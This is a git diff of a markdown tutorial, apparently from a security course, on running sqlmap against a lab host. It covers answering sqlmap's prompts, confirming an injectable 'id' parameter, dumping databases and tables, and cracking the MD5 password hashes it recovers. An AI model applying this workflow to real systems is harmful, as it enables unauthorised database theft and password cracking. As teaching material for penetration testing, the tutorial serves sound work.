@@ -22,29 +22,32 @@ sqlmap \
 - `-u` the target url
 - `--cookie` cookies captured by sniffing sessions
 
-**sqlmap with prompt multiple question, you should answer as follow:**
-
+sqlmap with prompt multiple question, you should answer as follow
 
 
 ```markdown
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
-```
-<!-- <span style="color: gold">Answer with no, otherwise the attack will take a very long time.</yellow> -->
 
-[!TIP] asd
+#Answer with no, otherwise the attack will take a very long time.
+```
 
 ```markdown
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+
+#Answer with yes
 ```
-<yellow>Answer with yes</mayellowrk>
 ```markdown
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+
+#Answer with no, anyway you may specify the paremeters with -p option for example -p "id"
 ```
-<yellow>Answer with no, anyway you may specify the paremeters with `-p` option for example `-p "id"`</yellow>
+
+
 ```markdown
 [15:32:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.70.6'
+
+#The result will be saved to local directory, and any previous attack on the same url will continue on the previous attack. otherwise you may reset the attack by deleting the directory sudo rm "/root/.local/share/sqlmap/output/192.168.70.6"
 ```
-<yellow>The result will be saved to local directory, and any previous attack on the same url will continue on the previous attack. otherwise you may reset the attack by deleting the directory `sudo rm "/root/.local/share/sqlmap/output/192.168.70.6"`</yellow>
 
 ---
 ### 2- dump all databases
@@ -191,17 +194,18 @@ sqlmap \
 - `-T` specify tables
 - `--dump` dump all data
 
-**sqlmap with prompt multiple question, you should answer as follow:**
+sqlmap with prompt multiple question, you should answer as follow
 ```markdown
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
-
+ 
+#Answer with no
 ```
-<yellow>Answer with no</yellow>
 
 ```markdown
 do you want to crack them via a dictionary-based attack? [Y/n/q] 
+
+#Answer with yes if you want to crack passwords.
 ```
-<yellow>#Answer with yes if you want to crack passwords.</yellow>
 
 ```
 [15:42:01] [INFO] using hash method 'md5_generic_passwd'
@@ -210,13 +214,13 @@ what dictionary do you want to use?
 [2] custom dictionary file
 [3] file with list of dictionary files
 ```
-<yellow>as you can see the hashing algorithm is detected "md5_generic_passwd", select the genric wordlist [1] or specify a custom dictionary file.</yellow>
+as you can see the hashing algorithm is detected "md5_generic_passwd", select the genric wordlist [1] or specify a custom dictionary file.
 
 ```markdown
 do you want to use common password suffixes? (slow!) [y/N]
 
+# Answer with no
 ```
-<yellow>Answer with no</yellow>
 
 
 
@@ -243,8 +247,3 @@ As shown all the data with passwords in the specified database and table are dum
 
 ---
 > For more questions email: nagy@aast.edu
-
-
-<style>
-yellow { color: Yellow }
-</style>
